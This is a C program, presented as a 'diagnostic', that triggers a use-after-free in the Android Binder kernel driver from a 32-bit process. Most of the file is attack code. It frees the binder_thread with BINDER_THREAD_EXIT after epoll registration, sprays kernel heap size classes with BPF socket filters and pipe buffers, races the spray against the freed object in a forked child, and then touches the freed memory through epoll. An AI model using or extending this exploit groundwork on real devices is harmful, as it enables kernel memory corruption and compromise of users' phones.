/*
 * compat_binder_final.c — Final 32-bit Binder UAF diagnostic
 *
 * Compile: arm-linux-musleabihf-gcc -static -O2 -o compat_binder_final compat_binder_final.c -lpthread
 *
 * Focused test: does ENTER_LOOPER actually work from 32-bit with
 * the correct 48-byte binder_write_read struct? And if so, does
 * THREAD_EXIT after looper entry + epoll cause any observable effect?
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <errno.h>
#include <fcntl.h>
#include <signal.h>
#include <pthread.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <sys/uio.h>
#include <sys/epoll.h>
#include <sys/socket.h>
#include <stdint.h>
#include <sys/wait.h>

/* binder_uintptr_t and binder_size_t are always __u64 */
struct binder_write_read {
    uint64_t write_size;
    uint64_t write_consumed;
    uint64_t write_buffer;
    uint64_t read_size;
    uint64_t read_consumed;
    uint64_t read_buffer;
};

struct binder_version {
    int32_t protocol_version;
};

#define BINDER_WRITE_READ_IOC   _IOWR('b', 1, struct binder_write_read)
#define BINDER_SET_MAX_THREADS  _IOW('b', 5, uint32_t)
#define BINDER_VERSION_IOC      _IOWR('b', 9, struct binder_version)
#define BINDER_THREAD_EXIT_IOC  _IOW('b', 8, int32_t)

#define BC_ENTER_LOOPER  13
#define BC_EXIT_LOOPER   14

static int binder_write(int bfd, void *data, uint32_t len)
{
    struct binder_write_read bwr = {0};
    bwr.write_size = len;
    bwr.write_buffer = (uint64_t)(uintptr_t)data;
    int ret = ioctl(bfd, BINDER_WRITE_READ_IOC, &bwr);
    if (ret < 0) return -errno;
    return (int)bwr.write_consumed;
}

int main(void)
{
    printf("=== 32-bit Compat Binder Final ===\n");
    printf("uid=%d pid=%d ptr=%zu long=%zu\n",
           getuid(), getpid(), sizeof(void *), sizeof(long));
    printf("BWR ioctl=0x%lx size=%zu\n\n",
           (unsigned long)BINDER_WRITE_READ_IOC,
           sizeof(struct binder_write_read));

    signal(SIGPIPE, SIG_IGN);

    /* Test 1: Basic binder write operation */
    printf("--- Test 1: ENTER_LOOPER from 32-bit ---\n");
    {
        int bfd = open("/dev/binder", O_RDWR | O_CLOEXEC);
        if (bfd < 0) { printf("FATAL: %s\n", strerror(errno)); return 1; }

        void *bmap = mmap(NULL, 1024*1024, PROT_READ, MAP_PRIVATE, bfd, 0);
        printf("  binder mmap: %p\n", bmap);

        uint32_t max = 0;
        ioctl(bfd, BINDER_SET_MAX_THREADS, &max);

        /* Enter looper */
        uint32_t cmd = BC_ENTER_LOOPER;
        int consumed = binder_write(bfd, &cmd, sizeof(cmd));
        printf("  ENTER_LOOPER: consumed=%d (expect 4)\n", consumed);

        if (consumed == 4) {
            printf("  LOOPER ENTERED SUCCESSFULLY\n");

            /* Now exit looper cleanly */
            cmd = BC_EXIT_LOOPER;
            consumed = binder_write(bfd, &cmd, sizeof(cmd));
            printf("  EXIT_LOOPER: consumed=%d\n", consumed);
        }

        munmap(bmap, 1024*1024);
        close(bfd);
    }

    /* Test 2: UAF trigger — looper + epoll + thread_exit */
    printf("\n--- Test 2: UAF trigger (looper → epoll → thread_exit → spray → touch) ---\n");
    {
        int bfd = open("/dev/binder", O_RDWR | O_CLOEXEC);
        void *bmap = mmap(NULL, 1024*1024, PROT_READ, MAP_PRIVATE, bfd, 0);
        uint32_t max = 0;
        ioctl(bfd, BINDER_SET_MAX_THREADS, &max);

        /* Step 1: Enter looper */
        uint32_t cmd = BC_ENTER_LOOPER;
        int consumed = binder_write(bfd, &cmd, sizeof(cmd));
        printf("  ENTER_LOOPER: consumed=%d\n", consumed);

        /* Step 2: Add to epoll */
        int epfd = epoll_create(1);
        struct epoll_event ev = { .events = EPOLLIN, .data = { .fd = bfd } };
        int ret = epoll_ctl(epfd, EPOLL_CTL_ADD, bfd, &ev);
        printf("  epoll ADD: %d (errno=%d)\n", ret, ret < 0 ? errno : 0);

        /* Step 3: THREAD_EXIT */
        printf("  >>> THREAD_EXIT <<<\n");
        int32_t dummy = 0;
        ret = ioctl(bfd, BINDER_THREAD_EXIT_IOC, &dummy);
        printf("  ret=%d errno=%d\n", ret, ret < 0 ? errno : 0);

        /* Step 4: Heavy spray — target kmalloc-128 and kmalloc-192
         * On 32-bit, wait_queue_t + epoll entry is ~28 bytes (kmalloc-32)
         * But binder_thread itself is larger (~192 bytes? kmalloc-192)
         * Try multiple size classes */
        printf("  --- Spray ---\n");

        /* Size class: 32 bytes (4 BPF instructions) */
        struct { uint16_t code; uint8_t jt, jf; uint32_t k; } insns4[4];
        for (int i = 0; i < 4; i++) { insns4[i].code = 0x06; insns4[i].k = 0xFFFF; }
        struct { uint16_t len; void *filter; } prog4 = { 4, insns4 };

        /* Size class: 128 bytes (16 BPF instructions) */
        struct { uint16_t code; uint8_t jt, jf; uint32_t k; } insns16[16];
        for (int i = 0; i < 16; i++) { insns16[i].code = 0x06; insns16[i].k = 0xFFFF; }
        struct { uint16_t len; void *filter; } prog16 = { 16, insns16 };

        /* Size class: 192 bytes (24 BPF instructions) */
        struct { uint16_t code; uint8_t jt, jf; uint32_t k; } insns24[24];
        for (int i = 0; i < 24; i++) { insns24[i].code = 0x06; insns24[i].k = 0xFFFF; }
        struct { uint16_t len; void *filter; } prog24 = { 24, insns24 };

        int socks[600];
        int cnt32 = 0, cnt128 = 0, cnt192 = 0;
        for (int i = 0; i < 200; i++) {
            socks[i] = socket(AF_INET, SOCK_DGRAM, 0);
            if (socks[i] >= 0 && setsockopt(socks[i], SOL_SOCKET, 26, &prog4, sizeof(prog4)) == 0)
                cnt32++;
        }
        for (int i = 200; i < 400; i++) {
            socks[i] = socket(AF_INET, SOCK_DGRAM, 0);
            if (socks[i] >= 0 && setsockopt(socks[i], SOL_SOCKET, 26, &prog16, sizeof(prog16)) == 0)
                cnt128++;
        }
        for (int i = 400; i < 600; i++) {
            socks[i] = socket(AF_INET, SOCK_DGRAM, 0);
            if (socks[i] >= 0 && setsockopt(socks[i], SOL_SOCKET, 26, &prog24, sizeof(prog24)) == 0)
                cnt192++;
        }
        printf("  BPF: 32B=%d 128B=%d 192B=%d\n", cnt32, cnt128, cnt192);

        /* Step 5: Touch freed memory */
        printf("  >>> epoll_ctl DEL <<<\n");
        ret = epoll_ctl(epfd, EPOLL_CTL_DEL, bfd, NULL);
        printf("  ret=%d errno=%d\n", ret, ret < 0 ? errno : 0);

        printf("  >>> epoll_wait <<<\n");
        struct epoll_event events[1];
        ret = epoll_wait(epfd, events, 1, 100);
        printf("  ret=%d errno=%d\n", ret, ret < 0 ? errno : 0);

        printf("  [survived]\n");

        close(epfd);
        for (int i = 0; i < 600; i++)
            if (socks[i] >= 0) close(socks[i]);
        munmap(bmap, 1024*1024);
        close(bfd);
    }

    /* Test 3: Thread race — fork a child that does UAF while parent sprays */
    printf("\n--- Test 3: Fork race (child=UAF, parent=spray) ---\n");
    {
        int bfd = open("/dev/binder", O_RDWR | O_CLOEXEC);
        void *bmap = mmap(NULL, 1024*1024, PROT_READ, MAP_PRIVATE, bfd, 0);
        uint32_t max = 0;
        ioctl(bfd, BINDER_SET_MAX_THREADS, &max);

        /* Enter looper */
        uint32_t cmd = BC_ENTER_LOOPER;
        binder_write(bfd, &cmd, sizeof(cmd));

        /* Add to epoll */
        int epfd = epoll_create(1);
        struct epoll_event ev = { .events = EPOLLIN, .data = { .fd = bfd } };
        epoll_ctl(epfd, EPOLL_CTL_ADD, bfd, &ev);

        /* Sync pipe */
        int sync[2];
        pipe(sync);

        pid_t pid = fork();
        if (pid == 0) {
            /* Child: wait for signal then spray aggressively */
            char c;
            read(sync[0], &c, 1);

            /* Spray as fast as possible */
            struct { uint16_t code; uint8_t jt, jf; uint32_t k; } insns[16];
            for (int i = 0; i < 16; i++) { insns[i].code = 0x06; insns[i].k = 0xFFFF; }
            struct { uint16_t len; void *filter; } prog = { 16, insns };

            int cnt = 0;
            for (int i = 0; i < 500; i++) {
                int s = socket(AF_INET, SOCK_DGRAM, 0);
                if (s >= 0 && setsockopt(s, SOL_SOCKET, 26, &prog, sizeof(prog)) == 0)
                    cnt++;
            }

            /* Also spray pipes */
            for (int i = 0; i < 200; i++) {
                int pfd[2];
                if (pipe(pfd) == 0) {
                    char buf[128];
                    memset(buf, 0x41, sizeof(buf));
                    write(pfd[1], buf, sizeof(buf));
                }
            }

            usleep(50000); /* 50ms for spray to settle */
            _exit(0);
        }

        /* Parent: trigger UAF then signal child to spray */
        printf("  >>> THREAD_EXIT <<<\n");
        int32_t dummy = 0;
        ioctl(bfd, BINDER_THREAD_EXIT_IOC, &dummy);

        /* Signal child to spray immediately */
        write(sync[1], "G", 1);

        /* Wait a tiny bit for spray */
        usleep(10000);

        /* Touch freed memory */
        printf("  >>> epoll_ctl DEL <<<\n");
        int ret = epoll_ctl(epfd, EPOLL_CTL_DEL, bfd, NULL);
        printf("  ret=%d errno=%d\n", ret, ret < 0 ? errno : 0);

        int status;
        waitpid(pid, &status, 0);
        printf("  child status: %d (signal=%d)\n",
               WEXITSTATUS(status), WTERMSIG(status));

        printf("  [survived]\n");

        close(epfd);
        close(sync[0]); close(sync[1]);
        munmap(bmap, 1024*1024);
        close(bfd);
    }

    /* Test 4: Check /proc/self/maps for any interesting changes after UAF */
    printf("\n--- Memory layout after tests ---\n");
    {
        FILE *f = fopen("/proc/self/maps", "r");
        if (f) {
            char line[256];
            int count = 0;
            while (fgets(line, sizeof(line), f)) {
                if (strstr(line, "binder") || strstr(line, "[stack]") ||
                    strstr(line, "[heap]") || strstr(line, "[vdso]"))
                    printf("  %s", line);
                count++;
            }
            printf("  Total mappings: %d\n", count);
            fclose(f);
        }
    }

    printf("\n=== Done ===\n");
    return 0;
}
